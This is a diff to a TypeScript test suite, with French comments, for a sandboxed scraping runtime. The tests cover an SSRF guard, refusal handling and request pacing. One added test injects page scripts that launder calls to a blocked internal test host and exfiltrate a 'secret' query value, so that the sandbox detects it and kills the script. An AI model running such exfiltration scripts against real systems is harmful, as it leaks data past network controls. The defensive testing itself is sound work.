@@ -23,7 +23,7 @@ type Logger = Parameters<typeof runScriptExecutor>[0]['logger'];
 import { startClient, type Client } from '../../fixtures/src/test-helpers.ts';
 // Paquets construits, comme le worker : mêmes classes (erreurs de garde, DslError) des deux côtés.
 import { DomainPacer, Secret, validateDeclarativeSpec, validateOutput, type DeclarativeSpec } from '@runtime/core';
-import { domainRequestPacer, runFetchExecutor, type DeclarativeRunResult, type RequestPacer } from '@runtime/core/exec';
+import { classifyExchange, domainRequestPacer, runFetchExecutor, type DeclarativeRunResult, type ExecFailure, type HttpExchange, type RequestPacer } from '@runtime/core/exec';
 import * as net from '@runtime/core/net';
 import {
   openBrowserEgress,
@@ -51,7 +51,11 @@ const SSRF = 'zz_test_ssrf.localhost';
 const EVIL = 'zz_test_evil.localhost';
 const LIMITED = 'zz_test_429.localhost';
 const PERSONAL = 'zz_test_personal.localhost';
-const HOSTS = [API, SSR, SPA, SLOW, INTERNAL, SSRF, EVIL, LIMITED, PERSONAL];
+/** Refus en cours de script (INV6) : 403 nu, défi servi en 200, 401 JSON. */
+const SIGNED403 = 'zz_test_signed403.localhost';
+const CHALLENGE_200 = 'zz_test_challenge_200.localhost';
+const LOGIN = 'zz_test_login.localhost';
+const HOSTS = [API, SSR, SPA, SLOW, INTERNAL, SSRF, EVIL, LIMITED, PERSONAL, SIGNED403, CHALLENGE_200, LOGIN];
 
 let client: Client;
 let guard: SsrfGuard;
@@ -210,6 +214,31 @@ describe('garde SSRF et politique de domaines', () => {
     expect((await client.stats()).hosts[INTERNAL]?.total ?? 0).toBe(0);
   });
 
+  test.each([
+    ['451 (géo-restriction)', '451', { failure_class: 'network', detail: 'geo_restriction' }],
+    ['503', '503', { failure_class: 'transient', detail: 'http_503' }],
+  ])('assert_subresource_cut_not_strategy_fault (E3) : page en %s dont le site charge des tiers coupés (pixel, redirection vers un tiers vue par le seul proxy d’egress) → classe d’origine, jamais domain_not_allowed', async (_name, status, expected) => {
+    const spec = valid(
+      { schema_version: 1, kind: 'declarative', request: { method: 'GET', url: `${base(SPA)}/tiers?status=${status}`, allowed_hosts: [SPA] }, sources: [{ id: 'dom', from: 'html', records: 'div.spa-item' }], fields: { title: { attr: 'text', type: 'string', required: true } } },
+      undefined,
+    );
+    let domainBlocked = 0;
+    const out = await withEgress(
+      { mode: 'direct' },
+      async (egress) => {
+        const result = await runPlaywrightExecutor({ pool, egress, guard, spec, input: {}, signal });
+        domainBlocked = egress.domainBlockedCount();
+        return result;
+      },
+      { allowedHosts: [SPA] },
+    );
+    expect(out).toMatchObject({ ok: false, failure: expected });
+    // Les deux coupures ont bien eu lieu : pixel (seconde couche) et saut de redirection (proxy d'egress).
+    expect(domainBlocked).toBeGreaterThan(0);
+    expect((await client.stats()).hosts[SPA]?.paths['/tiers/pixel'] ?? 0).toBeGreaterThan(0);
+    expect((await client.stats()).hosts[EVIL]?.total ?? 0).toBe(0);
+  }, 60_000);
+
   test('E2 : page hostile qui gonfle les lectures (TextDecoder surchargé, 100 M caractères) → response_too_large, rien de gros ne quitte la page', async () => {
     await client.control({ op: 'site', site: 'spa', mode: 'hostile' });
     const spec = valid(spaApiSpecInput(base(SPA), SPA), SCHEMA_PRODUCT);
@@ -341,7 +370,16 @@ describe('E3 en script dans le bac à sable (1.5) : ctx.page.*, ctx.fetch, ctx.e
   } as unknown as Logger;
   const limits = { timeoutMs: 20_000, memoryMb: 128 };
 
-  type ScriptOptions = { allowedHosts?: string[]; startUrl?: string; input?: unknown; pacer?: RequestPacer; maxRequests?: number; allowWriteActions?: boolean; logger?: Logger };
+  type ScriptOptions = {
+    allowedHosts?: string[];
+    startUrl?: string;
+    input?: unknown;
+    pacer?: RequestPacer;
+    maxRequests?: number;
+    allowWriteActions?: boolean;
+    logger?: Logger;
+    classify?: (exchange: HttpExchange) => ExecFailure | null;
+  };
   async function script(code: string, opts: ScriptOptions = {}): Promise<ScriptRunOutcome> {
     return withEgress(
       { mode: 'direct' },
@@ -364,6 +402,7 @@ describe('E3 en script dans le bac à sable (1.5) : ctx.page.*, ctx.fetch, ctx.e
             ...(opts.pacer === undefined ? {} : { pacer: opts.pacer }),
             ...(opts.maxRequests === undefined ? {} : { maxRequests: opts.maxRequests }),
             ...(opts.allowWriteActions === undefined ? {} : { allowWriteActions: opts.allowWriteActions }),
+            ...(opts.classify === undefined ? {} : { classify: opts.classify }),
           });
         } finally {
           await session.close();
@@ -524,7 +563,79 @@ describe('E3 en script dans le bac à sable (1.5) : ctx.page.*, ctx.fetch, ctx.e
     }
   }, 60_000);
 
-  test('assert_script_paced (1.9) : chaque ctx.fetch et ctx.page.goto réservent un créneau (écart ≥ min_delay_ms) ; un 429 + Retry-After allonge la cadence', async () => {
+  test.each([
+    [
+      'clic de l’hôte',
+      "await ctx.page.evaluate((u) => { setTimeout(() => { fetch(u).catch(() => {}); }, 300); return 1; }, input.url);\n" +
+        "try { await ctx.page.click('#zz_test_absent', { timeout: 2000 }); } catch (e) { /* attendu */ }",
+    ],
+    [
+      'navigation de l’hôte (goto lente)',
+      "await ctx.page.evaluate((u) => { setInterval(() => { fetch(u).catch(() => {}); }, 50); return 1; }, input.url);\n" +
+        'await ctx.page.goto(input.slow);',
+    ],
+    [
+      'navigation dans le document (pushState, le code reste)',
+      "await ctx.page.evaluate((u) => { history.pushState({}, '', '/zz_test_push'); setTimeout(() => { fetch(u).catch(() => {}); }, 300); return 1; }, input.url);\n" +
+        "try { await ctx.page.waitForSelector('#zz_test_absent', { timeout: 2000 }); } catch (e) { /* attendu */ }",
+    ],
+  ])('assert_sandbox (ctx.page, D-29) : blanchiment par %s (hôte hors API contacté par le code injecté pendant une opération de l’hôte, puis exfiltration) → sandbox_violation, enfant tué, 0 requête', async (_name, launder) => {
+    const out = await script(
+      launder +
+        "\nawait ctx.page.evaluate((u) => fetch(u + '&zz_test_data=secret').then(() => 1, () => 0), input.url);\nctx.emit({ title: 'jamais', price: 1 });",
+      { allowedHosts: [SPA, SLOW], input: { url: `${base(INTERNAL)}/collect?zz_test_exfil=1`, slow: `${base(SLOW)}/data?wait_seconds=1` } },
+    );
+    expect(out.result).toMatchObject({ ok: false, failure: { failure_class: 'code_error', detail: 'sandbox_violation' } });
+    expect(out.violations.find((v) => v.reason === 'domain_not_allowed')?.detail).toBe(INTERNAL);
+    expect(out.killed).toBe(true);
+    expect(out.killLatencyMs ?? Number.POSITIVE_INFINITY).toBeLessThan(2_000);
+    expect((await client.stats()).hosts[INTERNAL]?.total ?? 0).toBe(0);
+  }, 60_000);
+
+  /** Garde de contenu de 1.7 simulée : la page de défi générique des fixtures, servie en 200, est reconnue. */
+  const challengeAware = (exchange: HttpExchange): ExecFailure | null =>
+    exchange.body.includes('zz-test-challenge') ? { failure_class: 'blocked_by_protection', retryable: false, detail: 'challenge' } : classifyExchange(exchange);
+  test.each([
+    ['ctx.page.goto en 403', 'await ctx.page.goto(input.forbidden);', { failure_class: 'forbidden', detail: 'http_403' }],
+    ['ctx.fetch en 403', 'await ctx.fetch(input.forbidden);', { failure_class: 'forbidden', detail: 'http_403' }],
+    ['ctx.fetch en 401', 'await ctx.fetch(input.login);', { failure_class: 'auth_required', detail: 'http_401' }],
+    [
+      'ctx.page.goto vers un défi servi en 200',
+      "await ctx.page.goto(input.challenge);\nawait ctx.page.click('#zz-test-challenge input');",
+      { failure_class: 'blocked_by_protection', detail: 'challenge' },
+    ],
+    [
+      'clic qui mène à un défi servi en 200',
+      "await ctx.page.evaluate((u) => { const a = document.createElement('a'); a.id = 'zz_test_go'; a.href = u; a.textContent = 'suite'; document.body.appendChild(a); return 1; }, input.challenge);\n" +
+        "await ctx.page.click('#zz_test_go');\nconst html = await ctx.page.content();\nctx.emit({ title: html.slice(0, 50), price: 1 });\nawait ctx.page.click('#zz-test-challenge input');",
+      { failure_class: 'blocked_by_protection', detail: 'challenge' },
+    ],
+  ])('assert_script_refusal_stops (INV6) : page 1 conforme, puis %s → échec avec la classe du refus, rien rendu au script, 0 requête après le refus, 0 élément', async (_name, refusal, expected) => {
+    const out = await script(
+      "await ctx.page.waitForSelector('div.spa-item', { timeout: 10000 });\n" +
+        "for (const t of await ctx.page.textAll('div.spa-item')) { const m = /(.+) - ([0-9]+\\.[0-9]{2})/.exec(t); ctx.emit({ title: m[1].trim(), price: Number(m[2]) }); }\n" +
+        refusal +
+        "\nctx.emit({ title: 'après le refus', price: 1 });\nawait ctx.fetch(input.after);\nawait ctx.page.goto(input.after);",
+      {
+        allowedHosts: [SPA, SIGNED403, CHALLENGE_200, LOGIN],
+        classify: challengeAware,
+        input: {
+          forbidden: `${base(SIGNED403)}/plain-forbidden`,
+          login: `${base(LOGIN)}/api/orders`,
+          challenge: `${base(CHALLENGE_200)}/`,
+          after: `${base(SPA)}/items/zz_test_after`,
+        },
+      },
+    );
+    expect(out.result).toMatchObject({ ok: false, failure: { ...expected, retryable: false } });
+    expect(out.violations).toEqual([]);
+    // Rien de la page refusée n'a été rendu au script : aucun élément émis après le refus.
+    expect(out.items.length).toBeLessThanOrEqual(30);
+    expect(out.items.every((i) => (i as { title?: string }).title !== 'après le refus' && !/Security check/.test((i as { title?: string }).title ?? ''))).toBe(true);
+    expect((await client.stats()).hosts[SPA]?.paths['/items/zz_test_after'] ?? 0).toBe(0);
+  }, 60_000);
+
+  test('assert_script_paced (1.9) : chaque ctx.fetch et ctx.page.goto réservent un créneau (écart ≥ min_delay_ms) ; un 429 arrête l’essai (rate_limited) et son Retry-After allonge la cadence du run suivant', async () => {
     await client.control({ op: 'site', site: '429', retry_after: 1, limit: 100 });
     const inner = domainRequestPacer(new DomainPacer(memoryPacingStore()), { minDelayMs: 300, maxWaitMs: 20_000 });
     const grants: { url: string; at: number }[] = [];
@@ -540,24 +651,28 @@ describe('E3 en script dans le bac à sable (1.5) : ctx.page.*, ctx.fetch, ctx.e
         await inner.report(url, response);
       },
     };
+    const opts = { allowedHosts: [LIMITED], startUrl: `${base(LIMITED)}/`, input: { base: base(LIMITED) }, pacer };
     const out = await script(
-      `const statuses = [];
-       for (const path of ['/', '/', '/always', '/']) statuses.push((await ctx.fetch(input.base + path)).status);
+      `for (const path of ['/', '/']) await ctx.fetch(input.base + path);
        await ctx.page.goto(input.base + '/');
-       ctx.emit({ title: statuses.join(','), price: 1 });`,
-      { allowedHosts: [LIMITED], startUrl: `${base(LIMITED)}/`, input: { base: base(LIMITED) }, pacer },
+       ctx.emit({ title: 'avant', price: 1 });
+       await ctx.fetch(input.base + '/always');
+       await ctx.fetch(input.base + '/');
+       ctx.emit({ title: 'jamais', price: 1 });`,
+      opts,
     );
     expect(out.violations).toEqual([]);
-    expectConform(out.result, SCHEMA_PRODUCT, 1);
-    expect(out.result.ok && out.result.records[0]?.['title']).toBe('200,200,429,200');
-    // Page de départ, 4 ctx.fetch, ctx.page.goto : 6 créneaux, 6 comptes rendus (dont le 429).
-    expect(grants).toHaveLength(6);
-    expect(reports).toEqual([200, 200, 200, 429, 200, 200]);
+    expect(out.result).toMatchObject({ ok: false, failure: { failure_class: 'rate_limited', retryable: true, detail: 'http_429' } });
+    // Page de départ, 2 ctx.fetch, ctx.page.goto, ctx.fetch en 429 : 5 créneaux, 5 comptes rendus ; rien après le 429.
+    expect(grants).toHaveLength(5);
+    expect(reports).toEqual([200, 200, 200, 200, 429]);
     const gaps = grants.slice(1).map((g, i) => g.at - grants[i]!.at);
     for (const gap of gaps) expect(gap).toBeGreaterThanOrEqual(290);
-    // Après le 429 (Retry-After : 1 s), la requête suivante attend au moins 1 s.
-    expect(gaps[3]).toBeGreaterThanOrEqual(990);
-    expect(out.result.ok && out.result.requests).toBe(6);
+    // Run suivant sur le domaine : sa page de départ attend le Retry-After (1 s) du 429.
+    const next = await script(`ctx.emit({ title: 'après', price: 1 });`, opts);
+    expectConform(next.result, SCHEMA_PRODUCT, 1);
+    expect(grants).toHaveLength(6);
+    expect(grants[5]!.at - grants[4]!.at).toBeGreaterThanOrEqual(990);
   }, 60_000);
 
   test('assert_script_paced (max_requests_per_run) : ctx.fetch et ctx.page partagent le plafond ; au-delà, refus sans violation (request_cap), sortie tronquée', async () => {
